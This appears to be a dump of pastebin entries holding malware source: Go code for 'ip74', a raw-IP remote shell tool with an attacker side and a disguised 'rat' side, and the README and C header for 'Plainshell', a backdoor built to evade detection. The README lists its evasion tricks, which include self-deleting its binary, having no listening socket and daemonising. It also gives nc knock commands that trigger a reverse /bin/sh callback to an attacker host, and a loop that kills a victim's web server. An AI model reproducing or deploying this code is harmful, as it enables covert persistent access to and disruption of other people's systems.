		if nil != rerr {
			return rerr
		}
		if nil != werr {
			return werr
		}
	}
}

/* heartbeet sends 0-byte messages on c at roughly the given interval, as
keepalives */
func heartbeet(c net.Conn, interval time.Duration) {
	for {
		if _, err := c.Write([]byte{}); nil != err {
			log.Fatalf(""Heartbeet: %v"", err)
		}
		time.Sleep(interval)
	}
}

/* connect ""connects"" to the other side */
func connect(
	laddr string,
	raddr string,
	proto uint,
	hbint time.Duration,
) *net.IPConn {
	c, err := net.DialIP(
		fmt.Sprintf(""ip:%v"", proto),
		resolve(laddr),
		resolve(raddr),
	)
	if nil != err {
		log.Fatalf(""Dial: %v"", err)
	}

	/* Start to heartbeet */
	go heartbeet(c, hbint)

	return c
}"
qKVHbaFB,ip74.go,FlyFar,Go,Saturday 20th of January 2024 05:22:18 AM CDT,"package main

import (
	""bufio""
	""bytes""
	""flag""
	""fmt""
	""log""
	""os""
	""time""
)

/*
 * ip74.go
 * Program to send and receive comms over raw IP
 * By J. Stuart McMurray
 * Created 20160226
 * Last Modified 20160226
 */

const (
	HBINT    = time.Minute    /* Default heartbeet interval */
	NAME     = ""zzzzzzziprat"" /* Name for child process */
	REMOTE   = ""127.0.0.1""    /* Default remote address */
	BUFLEN   = 65511          /* Copy buffer size */
	PROTO    = 74             /* Default IP protocol */
	KEYLEN   = 32             /* Key length */
	NONCELEN = 24             /* Nonce length, must be < BUFLEN */
)

/* Make sure BUFLEN and NONCELEN work */
func init() {
	if BUFLEN <= NONCELEN ||
		(BUFLEN+NONCELEN) > 65535 {
		panic(""Invalid buffer sizes"")
	}
}

func main() {
	/* Get the local address */
	loc, err := localIP()
	if nil != err {
		log.Printf(""Unable to determine local address: %v"", err)
	}
	var (
		laddr = flag.String(
			""l"",
			loc,
			""Local `address`"",
		)
		raddr = flag.String(
			""r"",
			REMOTE,
			""Remote `address`"",
		)
		proto = flag.Uint(
			""p"",
			PROTO,
			""IP protocol `number`"",
		)
		attacker = flag.Bool(
			""s"",
			false,
			""Don't spawn a shell, use stdio instead ""+
				""(set on attacker side)"",
		)
		name = flag.String(
			""n"",
			NAME,
			""Process `name` for child (ignored if -s is set)"",
		)
		hbint = flag.Duration(
			""i"",
			HBINT,
			""Heartbeet `interval`"",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]
	
Sends and receives ip packets between the remote and local hosts and either
proxies the data to a shell or stdio.

Two newline-terminated 32-byte keys expected on stdin.  The first is for
decrypting data read from the network, and the second is to encrypt data to be
sent on the network.

If -s is given, instead of connecting a shell to the network, it connects stdio
to the network.  Use on the attacker side.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Set up networking */
	c := connect(*laddr, *raddr, *proto, *hbint)

	/* Be comms or a rat */
	if *attacker {
		attack(c)
	} else {
		shell(c, *name)
	}
	log.Printf(""Done."")

}

/* getKey gets a key from stdin, or dies if it's the wrong length. */
func getKey(r *bufio.Reader) [KEYLEN]byte {
	var a [KEYLEN]byte
	/* Read the key */
	l, err := r.ReadBytes('\n')
	if nil != err {
		log.Fatalf(""Error reading key: %v"", err)
	}
	l = bytes.TrimRight(l, ""\n"")
	/* Check the length */
	if KEYLEN != len(l) {
		log.Fatalf(
			""Key wrong length.  Expected %v, got %v"",
			KEYLEN,
			len(l),
		)
	}
	/* Copy it to an array */
	for i, v := range l {
		a[i] = v
	}
	return a
}"
nSvJQm1h,attack.go,FlyFar,Go,Saturday 20th of January 2024 05:21:31 AM CDT,"package main

/*
 * attack.go
 * Attacker side of ip74
 * By J. Stuart McMurray
 * Created 2016022
 * Last Modified 2016022
 */

import (
	""bufio""
	""fmt""
	""io""
	""log""
	""net""
	""os""
)

/* attack proxies stdio to the remote end connected to c. */
func attack(c *net.IPConn) {
	/* Get attack keys */
	skey, rkey := readAttackKeys()

	log.Printf(""Ready to attack! %v <-> %v"", c.LocalAddr(), c.RemoteAddr())

	/* Read data from stdin, pass to target */
	ec := make(chan error)
	go send(c, os.Stdin, skey, ec)
	go recv(os.Stdout, c, rkey, ec)

	/* Wait for something to go wrong */
	err := <-ec
	if nil == err || io.EOF == err {
		return
	}
	log.Fatalf(""Error: %v"", err)
}

/* readAttackKeys prompts for and reads keys from stdin.  It will exit the
program with a call to log.Fatalf if the keys cannot be read or if either of
the keys is the wrong length. */
func readAttackKeys() (send, recv [KEYLEN]byte) {
	r := bufio.NewReader(os.Stdin)
	/* Get send key */
	fmt.Fprintf(os.Stderr, ""32-byte send (encryption) key: "")
	send = getKey(r)
	fmt.Fprintf(os.Stderr, ""32-byte receive (decryption) key: "")
	recv = getKey(r)

	return
}"
TT9JArBc,README,FlyFar,Email,Saturday 20th of January 2024 05:19:50 AM CDT,"Plainshell
Plainshell is a small backdoor meant to be hard to find.

It is a response to a certain CCDC team catching most of my malware by inspecting the output of netstat.

Sneaky Features
There are several things Plainshell does which (hopefully) makes it a bit harder to find:

No command-line arguments. Feel free to use whatever looks normal in the process list. Config is accomplished by editing config.h.
No listening socket. Sessions are initiated via a UDP packet read via pcap.
The connected shell is /bin/sh, with stdio hooked up to the network, so no danger of the binary being pulled out of /proc/pid/exe.
The connected shell has a parent PID of 1 and is its session leader.

Compilation
1. Edit config.h
2. Run ./build.sh in the Plainshell directory

Installation
1. Upload
2 ./backdoor (with a better name, hopefully).

Once started, Plainshell will:
- Remove its binary (assuming you didn't use exec -a)
- Background itself (via daemon(3))
- Remove a leading ./ from its process name
- Passively watch the network for knock packets

Knocking
Plainshell passively monitors the network for packets matching a given BPF filter (set in config.h). The last six bytes of the packet are the IPv4 address and port to which to connect, as so:

...packet | address | port |
--------->|<---4--->|<-2-->| 

The same binary can be used with the --k flag to generate this packet:

./plainshell --k 192.168.1.2 443 | nc -u -p 31337 192.168.1.3 53
nc -vl 443 (BSD)
nc -vlp 443 (Linux)
The above would send a packet to the Plainshell at 192.168.1.3 with UDP destination port 53 and source port 31337, requesting a shell to call back to 102.168.1.2:443 (TCP)
Since Plainshell listens with pcap, host-based firewalls (i.e. iptables or pf) shouldn't prevent knock packets from getting through.

Shell
Before the shell calls back, the process will wait a configurable number of seconds to allow for a one-line knock/netcat command.

The shell that calls back will be completely unencrypted; it's just /bin/sh with stdio connected to the network connection. Don't expect a prompt.

Irritating CCDC Defenders:
while :; do
        ./plainshell --k 192.168.0.2 4444 | nc -Nup 31337 192.168.0.3 53
        echo killall apache2 | nc -vlN 4444
        sleep 60
done"
2a7rQMWq,plainshell.h,FlyFar,C,Saturday 20th of January 2024 05:16:20 AM CDT,"/*
 * plainshell.h
 * Defines and includes and prototypes
 * By J. Stuart McMurray
 * Created 20160317
 * Last Modified 20160319
 */

#ifndef HAVE_PLAINSHELL_H
#define HAVE_PLAINSHELL_H 1

#define _GNU_SOURCE /* Blech */

#include <sys/socket.h>
#include <sys/stat.h>

#include <arpa/inet.h>
#include <netinet/in.h>

#include <assert.h>
#include <err.h>
#include <pcap.h>
#include <signal.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include ""config.h""

/* Make a knock packet.  Expects the address and port to which the backdoor
 * should call back. */
int make_knock(const char *address, const char *port);

/* init_pcap sets up a pcap monitorer. */
pcap_t *init_pcap();

/* handle takes a packet, and double-forks off a handler for it. */
void handle(u_char *name, const struct pcap_pkthdr *hdr, const u_char *pkt);

/* shell calls back the address specified in the last six bytes of pkt, which
 * is of length len. */
void shell(const u_char *pkt, bpf_u_int32 len);

/* remove_dot_slash removes the leading ./ from the string at ./ by changing
 * where the passed-in pointer points.  Thus, there is two bytes of leakage.
 * If the string doesn't start with ./, nothing happens. */
void remove_dot_slash(char **s);

/* rmbin removes whatever is at p, if it exists */
void rmbin(char *p);

#endif /* HAVE_PLAINSHELL_H */"
